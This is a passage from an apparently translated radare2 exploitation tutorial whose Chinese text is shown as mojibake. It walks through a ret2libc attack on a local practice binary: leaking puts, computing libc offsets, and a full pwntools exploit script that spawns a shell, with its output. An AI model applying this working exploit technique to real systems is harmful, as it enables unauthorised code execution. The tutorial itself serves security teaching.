<p>æˆ‘æ‰§è¡Œäº†è„šæœ¬ä¸‰æ¬¡ï¼Œ<code>puts</code>çš„åœ°å€æ¯æ¬¡éƒ½ä¼šå˜å¾—ä¸ä¸€æ ·ã€‚å› æ­¤æˆ‘ä»¬ä¸èƒ½æå‰é¢„æµ‹å®ƒçš„åœ°å€ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>puts</code>åœ¨<em>libc</em>ä¸­çš„åç§»ï¼Œç„¶åè®¡ç®—å‡º<em>libc</em>çš„åŸºå€ã€‚åœ¨æˆ‘ä»¬æ‰¾åˆ°åŸºå€åï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åç§»è®¡ç®—å‡º<code>system</code>ã€<code>exit</code>ä»¥åŠå­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬çš„è„šæœ¬åº”è¯¥æ˜¯è¿™æ ·ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = </span><br><span class="line">offset_system = </span><br><span class="line">offset_str_bin_sh = </span><br><span class="line">offset_exit = </span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line"> </span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">"libc base: 0x%x"</span> % libc_base)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line">    exit_addr = libc_base  + offset_exit</span><br><span class="line"> </span><br><span class="line">    log.info(<span class="string">"system: 0x%x"</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">"binsh: 0x%x"</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">"exit: 0x%x"</span> % exit_addr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="è®¡ç®—çœŸå®åœ°å€"><a href="#è®¡ç®—çœŸå®åœ°å€" class="headerlink" title="è®¡ç®—çœŸå®åœ°å€"></a>è®¡ç®—çœŸå®åœ°å€</h2><p><em>è¯·æ³¨æ„åœ¨æ–‡ç« çš„è¿™éƒ¨åˆ†ï¼Œæˆ‘çš„ç»“æœå¯èƒ½ä¸ä½ çš„ä¸åŒã€‚å› ä¸ºæˆ‘ä»¬çš„libcç‰ˆæœ¬ä¸åŒï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿä¸åŒçš„åç§»ã€‚</em></p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>puts</code>åœ¨<em>libc</em>ä¸Šçš„åç§»ã€‚æˆ‘ä»¬å†ä¸€æ¬¡æ‰“å¼€<code>radare2</code>ï¼Œç»§ç»­æ‰§è¡Œåˆ°å…¥å£ç‚¹ã€‚åšä»¥ä¸Šæ­¥éª¤çš„åŸå› æ˜¯æˆ‘ä»¬åœ¨<em>libc</em>è½½å…¥ä¹‹å‰å¼€å§‹è°ƒè¯•ç¨‹åºï¼Œç›´åˆ°å…¥å£ç‚¹æ—¶ï¼Œè¿è¡Œåº“æ‰å…¨éƒ¨åŠ è½½å®Œã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨<code>dmi</code>å‘½ä»¤ï¼Œå°†<em>libc</em>å’Œå‡½æ•°ä½œä¸ºå‚æ•°ã€‚æˆ‘åŠ ä¸Šäº†<code>~</code>æ¥æ˜¾ç¤ºç›¸å…³çš„ä¿¡æ¯ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> r2 -d megabeets_0x2</span></span><br><span class="line">Process with PID 24124 startedâ€¦</span><br><span class="line">= attach 24124 24124</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line">â€” A C program is like a fast dance on a newly waxed dance floor by people carrying razors â€“ Waldi Ravens</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf771ab30]&gt;</span><span class="bash"> dcu entry0</span></span><br><span class="line">Continue until 0x080483d0 using 1 bpsize</span><br><span class="line">hit breakpoint at: 80483d0</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> dmi libc puts~ puts$</span></span><br><span class="line">vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> dmi libc system~ system$</span></span><br><span class="line">vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> dmi libc <span class="built_in">exit</span>~ <span class="built_in">exit</span>$</span></span><br><span class="line">vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit</span><br></pre></td></tr></table></figure>
<p><em>è¯·æ³¨æ„ï¼Œåœ¨è¿™ç¯‡æ–‡ç« å‘è¡¨å‰ï¼Œ<code>dmi</code>çš„è¾“å‡ºæ ¼å¼å°±å·²ç»æ”¹å˜äº†ã€‚ä½ çš„ç»“æœå¾ˆæœ‰å¯èƒ½ä¸æˆ‘çš„æœ‰æ‰€ä¸åŒã€‚</em></p>
<p>æ‰€æœ‰è¿™äº›<code>paddr=0x000xxxxx</code>æ˜¯å‡½æ•°åœ¨<em>libc</em>ä¸Šçš„åç§»ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºä¸­æ‰¾åˆ°<code>/bin/sh</code>çš„ä½ç½®ã€‚æˆ‘ä»¬å°†è¦ä½¿ç”¨<code>radare2</code>çš„ä¸€äº›æœç´¢åŠŸèƒ½ã€‚<code>radare2</code>é»˜è®¤åœ¨<code>dbg.map</code>ï¼Œä¹Ÿå°±æ˜¯å½“å‰å†…å­˜ä¸­æŸ¥æ‰¾ã€‚æˆ‘ä»¬æƒ³è¦åœ¨æ‰€æœ‰å†…å­˜ä¸­æŸ¥æ‰¾åˆ™éœ€è¦è®¾ç½®æˆï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> e search.in = dbg.maps</span></span><br></pre></td></tr></table></figure>
<p>ä½ å¯ä»¥æ‰§è¡Œ<code>e search.in=?</code>æŸ¥çœ‹æ›´å¤šé€‰é¡¹ã€‚æ‰§è¡Œ<code>Ve</code>é…ç½®å¯è§†åŒ–æ¨¡å¼</p>
<p>åœ¨<code>radare2</code>ä¸­é€šè¿‡<code>/</code>å‘½ä»¤æŸ¥æ‰¾ã€‚è®©æˆ‘ä»¬çœ‹çœ‹<code>radare2</code>ç»™æˆ‘ä»¬æä¾›çš„æŸ¥æ‰¾å‚æ•°ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">|Usage: /[amx/] [arg]Search stuff (see â€˜e??searchâ€™ for options)</span><br><span class="line">| / foo\x00           search for string â€˜foo\0â€™</span><br><span class="line">| /j foo\x00          search for string â€˜foo\0â€™ (json output)</span><br><span class="line">| /! ff               search for first occurrence not matching</span><br><span class="line">| /+ /bin/sh          construct the string with chunks</span><br><span class="line">| /!x 00              inverse hexa search (find first byte != 0x00)</span><br><span class="line">| //                  repeat last search</span><br><span class="line">| /h[t] [hash] [len]  find block matching this hash. See /#?</span><br><span class="line">| /a jmp eax          assemble opcode and search its bytes</span><br><span class="line">| /A jmp              find analyzed instructions of this type (/A? for help)</span><br><span class="line">| /b                  search backwards</span><br><span class="line">| /B                  search recognized RBin headers</span><br><span class="line">| /c jmp [esp]        search for asm code</span><br><span class="line">| /C[ar]              search for crypto materials</span><br><span class="line">| /d 101112           search for a deltified sequence of bytes</span><br><span class="line">| /e /E.F/i           match regular expression</span><br><span class="line">| /E esil-expr        offset matching given esil expressions %%= here</span><br><span class="line">| /f file [off] [sz]  search contents of file with offset and size</span><br><span class="line">| /i foo              search for string â€˜fooâ€™ ignoring case</span><br><span class="line">| /m magicfile        search for matching magic file (use blocksize)</span><br><span class="line">| /o                  show offset of previous instruction</span><br><span class="line">| /p patternsize      search for pattern of given size</span><br><span class="line">| /P patternsize      search similar blocks</span><br><span class="line">| /r[e] sym.printf    analyze opcode reference an offset (/re for esil)</span><br><span class="line">| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated</span><br><span class="line">| /v[1248] value      look for an cfg.bigendian 32bit value</span><br><span class="line">| /V[1248] min max    look for an cfg.bigendian 32bit value in range</span><br><span class="line">| /w foo              search for wide string â€˜f\0o\0o\0â€™</span><br><span class="line">| /wi foo             search for wide string ignoring case â€˜f\0o\0o\0â€™</span><br><span class="line">| /x ff..33           search for hex string ignoring some nibbles</span><br><span class="line">| /x ff0033           search for hex string</span><br><span class="line">| /x ff43 ffd0        search for hexpair with mask</span><br><span class="line">| /z min max          search for strings of given size</span><br></pre></td></tr></table></figure>
<p>æä¾›ç»™æˆ‘ä»¬äº†è®¸å¤šä¸åŒçš„æ–¹å¼ã€‚åŒæ—¶è¿˜å‘å¿ƒ<code>/R</code>èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾ROPã€‚å¯æƒœè¿™ç¯‡æ–‡ç« é‡Œæˆ‘ä»¬æ²¡æœ‰æ‰“ç®—ä½¿ç”¨ROPã€‚ä½†å…¶ä»–æƒ…å†µä¸‹ï¼Œä½ ä»¬å†™åˆ©ç”¨è„šæœ¬æ—¶ä¸€å®šå¾ˆå–œæ¬¢ç”¨å®ƒã€‚</p>
<p>æˆ‘ä»¬ä¸éœ€è¦ä»»ä½•èŠ±å“¨çš„ä¸œè¥¿ï¼Œåªç”¨æœ€ç®€å•çš„æŸ¥æ‰¾å³å¯ã€‚åœ¨è¿™ä¹‹åï¼Œæˆ‘ä»¬å…ˆæ‰¾åˆ°å½“å‰<em>libc</em>è½½å…¥çš„åœ°å€ï¼Œç„¶åè®¡ç®—å‡º<code>/bin/sh</code>çš„åç§»ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> / /bin/sh</span></span><br><span class="line">Searching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68</span><br><span class="line">Searching 7 bytes in [0x8048000-0x8049000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0x8049000-0x804a000]</span><br><span class="line">hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xffd2f000-0xffd50000]</span><br><span class="line">hits: 0</span><br><span class="line">0xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica.</span><br></pre></td></tr></table></figure>
<p><code>r2</code>åœ¨å†…å­˜ä¸­æ‰¾åˆ°äº†<code>/bin/sh</code>ã€‚ç°åœ¨æˆ‘ä»¬è®¡ç®—å®ƒç›¸å¯¹<em>libc</em>åŸºå€çš„åç§»ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> dmm~libc</span></span><br><span class="line">0xf7599000 /usr/lib32/libc-2.25.so</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> ?X 0xf7700768-0xf7599000</span></span><br><span class="line">167768</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å‘ç°<code>/bin/sh</code>ç›¸å¯¹<em>libc</em>åŸºå€çš„åç§»ä¸º<code>0x167768</code>ã€‚æˆ‘ä»¬æŠŠå®ƒå¡«è¿›è„šæœ¬ä¸­ï¼Œå¹¶ä¸”å¯ä»¥å¼€å§‹æˆ‘ä»¬çš„æœ€åä¸€ä¸ªæ­¥éª¤ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = <span class="number">0x00062710</span> </span><br><span class="line">offset_system = <span class="number">0x0003c060</span> </span><br><span class="line">offset_exit = <span class="number">0x0002f1b0</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x167768</span>  </span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="è·å–shell"><a href="#è·å–shell" class="headerlink" title="è·å–shell"></a>è·å–shell</h2><p>æ¼æ´åˆ©ç”¨çš„ç¬¬äºŒé˜¶æ®µå¾ˆç›´æ¥ã€‚æˆ‘ä»¬ç»§ç»­ä½¿ç”¨140ä¸ªå­—ç¬¦ï¼Œç„¶åè°ƒç”¨<code>system</code>å¹¶å°†<code>/bin/sh</code>ä½œä¸ºå‚æ•°ï¼Œæœ€å<code>exit</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|       Stage 2       |</span><br><span class="line">+---------------------+</span><br><span class="line">| padding (140 bytes) |</span><br><span class="line">| system@libc         |</span><br><span class="line">| exit@libc           |</span><br><span class="line">| /bin/sh address     |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
<p>è¿˜è®°å¾—ä¸Šä¸€æ¬¡æˆ‘ä»¬è¿”å›åˆ°äº†å…¥å£ç‚¹å—ï¼Ÿè¿™æ„å‘³ç€<code>scanf</code>åˆåœ¨ç­‰å¾…æˆ‘ä»¬çš„è¾“å…¥ã€‚ç°åœ¨æˆ‘ä»¬æ‰€åšçš„å°±æ˜¯æŠŠè¿™äº›è°ƒç”¨ä¸²è”èµ·æ¥ä¼ ç»™ç¨‹åºã€‚</p>
<p>è¿™æ˜¯æˆ‘ä»¬æœ€åçš„è„šæœ¬ã€‚åƒæˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œä½ åªéœ€è¦æ›¿æ¢ç¬¦åˆä½ çš„<em>libc</em>çš„åç§»ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = <span class="number">0x00062710</span> </span><br><span class="line">offset_system = <span class="number">0x0003c060</span> </span><br><span class="line">offset_exit = <span class="number">0x0002f1b0</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x167768</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">"libc base: 0x%x"</span> % libc_base)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    exit_addr = libc_base  + offset_exit</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line"> </span><br><span class="line">    log.info(<span class="string">"system is at: 0x%x"</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">"/bin/sh is at: 0x%x"</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">"exit is at: 0x%x"</span> % exit_addr)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Build 2nd payload</span></span><br><span class="line">    payload2  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain2 =  p32(system_addr)</span><br><span class="line">    ropchain2 += p32(exit_addr)</span><br><span class="line">    <span class="comment"># Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)</span></span><br><span class="line">    <span class="comment">#           Then you'll execute system("sh")</span></span><br><span class="line">    ropchain2 += p32(binsh_addr) </span><br><span class="line"> </span><br><span class="line">    payload2 = payload2 + ropchain2</span><br><span class="line">    p.sendline(payload2)</span><br><span class="line"> </span><br><span class="line">    log.success(<span class="string">"Here comes the shell!"</span>)</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.interactive()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>è·‘è¿™ä¸ªè„šæœ¬æˆ‘ä»¬å°±èƒ½æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshellï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python exploit.py</span></span><br><span class="line">[+] Starting local process â€˜./megabeets_0x2â€™: pid 24410</span><br><span class="line">[*] puts is at: 0xf75db710</span><br><span class="line">[*] libc base: 0xf75ce000</span><br><span class="line">[*] system is at: 0xf760a060</span><br><span class="line">[*] /bin/sh is at: 0xf7735768</span><br><span class="line">[*] exit is at: 0xf75fd1b0</span><br><span class="line">[+] Here comes the shell!</span><br><span class="line">[*] Switching to interactive mode:</span><br><span class="line">  </span><br><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line">beet</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> EOF</span></span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p><code>Radare2</code>ä¹‹æ—…çš„ç¬¬äºŒéƒ¨åˆ†å°±åˆ°æ­¤ç»“æŸäº†ã€‚æˆ‘ä»¬ç®€å•åœ°å­¦ä¹ äº†ä¸€äº›<code>radare2</code>ä¸­æ¼æ´åˆ©ç”¨çš„åŠŸèƒ½ã€‚åœ¨ä¸‹ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬ä¼šå­¦ä¹ <code>radare2</code>å†è„šæœ¬ç¼–å†™å’Œæ¶æ„è½¯ä»¶åˆ†æä¸­çš„åŠŸèƒ½ã€‚</p>
<h1 id="æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨"><a href="#æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨" class="headerlink" title="æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨"></a>æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨</h1><p>è¿™æ˜¯ä¸€ç³»åˆ—æˆ‘åœ¨æœ¬æ–‡ä¸­æåˆ°çš„å‘½ä»¤ï¼ˆè¿˜æœ‰ä¸€äº›è¡¥å……ï¼‰ã€‚ä½ å¯ä»¥æŠŠå®ƒä½œä¸ºä¸€ä»½å‚è€ƒè¡¨ã€‚</p>
<h2 id="è·å–ä¿¡æ¯"><a href="#è·å–ä¿¡æ¯" class="headerlink" title="è·å–ä¿¡æ¯"></a>è·å–ä¿¡æ¯</h2><ul>
<li><code>$ rabin2 -I ./program</code>â€”â€”äºŒè¿›åˆ¶ä¿¡æ¯ï¼ˆå’Œ<code>radare2</code>çš„shellä¸­<code>i</code>å‘½ä»¤ç›¸åŒï¼‰</li>
<li><code>ii [q]</code>â€”â€”å¯¼å…¥è¡¨</li>
<li><code>?v sym.imp.func_name</code>â€”â€”è·å–<code>func_name@PLT</code>åœ°å€</li>
<li><code>?v reloc.func_name</code>â€”â€”è·å–<code>func_name@GOT</code>åœ°å€</li>
<li><code>ie [q]</code>â€”â€”è·å–å…¥å£ç‚¹åœ°å€</li>
<li><code>iS</code>â€”â€”æŸ¥çœ‹åŒºæ®µçš„å„ä¸ªæƒé™ï¼ˆè¯»/å†™/æ‰§è¡Œï¼‰</li>
<li><code>i~canary</code>â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯<code>Canary</code></li>
<li><code>i~pic</code>â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯<code>PIE</code></li>
<li><code>i~nx</code>â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯<code>NX</code></li>
</ul>
<h2 id="å†…å­˜"><a href="#å†…å­˜" class="headerlink" title="å†…å­˜"></a>å†…å­˜</h2><ul>
<li><code>dm</code>â€”â€”æŸ¥çœ‹å†…å­˜ä¿¡æ¯</li>
<li><code>dmm</code>â€”â€”åˆ—å‡ºæ¨¡å—ï¼ˆå†…å­˜ä¸­çš„è¿è¡Œåº“å’ŒäºŒè¿›åˆ¶æ¨¡å—ï¼‰</li>
<li><code>dmi [addr|libname] [symname]</code>â€”â€”åˆ—å‡ºç›®æ ‡åº“çš„æ ‡å¿—</li>
</ul>
<h2 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h2><ul>
<li><code>e search.*</code>â€”â€”ç¼–è¾‘æŸ¥æ‰¾é…ç½®</li>
<li><code>/?</code>â€”â€”åˆ—å‡ºæŸ¥æ‰¾çš„å­å‘½ä»¤</li>
<li><code>/ string</code>â€”â€”åœ¨å†…å­˜æˆ–ç¨‹åºæ®µæŸ¥æ‰¾å­—ç¬¦ä¸²</li>
<li><code>/R [?]</code>â€”â€”æŸ¥æ‰¾ç‰¹å®šçš„ROP</li>
